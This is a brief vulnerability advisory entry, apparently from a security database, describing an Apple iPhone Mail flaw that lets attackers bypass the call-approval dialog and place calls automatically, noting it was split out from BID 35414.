Apple iPhone is prone to a security-bypass vulnerability that may cause a call to be placed automatically.

Successfully exploiting this issue may allow attackers to bypass the Mail's call-approval dialog and place a call automatically from a vulnerable device.

NOTE: This issue was previously covered in BID 35414 (Apple iPhone and iPod touch Prior to Version 3.0 Multiple Vulnerabilities), but has been assigned its own record to better document it.
